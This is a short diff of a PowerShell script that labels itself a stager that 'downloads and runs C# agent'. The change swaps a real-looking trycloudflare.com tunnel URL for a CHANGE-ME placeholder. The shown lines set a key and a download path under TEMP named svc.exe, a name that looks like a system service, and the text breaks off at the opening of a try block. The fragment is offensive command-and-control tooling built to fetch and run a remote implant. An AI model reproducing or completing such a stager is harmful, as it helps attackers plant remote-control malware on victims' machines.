@@ -1,5 +1,5 @@
 # Stager - Downloads and runs C# agent
-$u='https://dietary-clearing-literature-click.trycloudflare.com'
+$u='https://CHANGE-MECHANGE-ME.trycloudflare.com'
 $k='8e016e25d56cd0ac28ed60cf2d0bc3a8'
 $d=$env:TEMP+'\svc.exe'
 try {
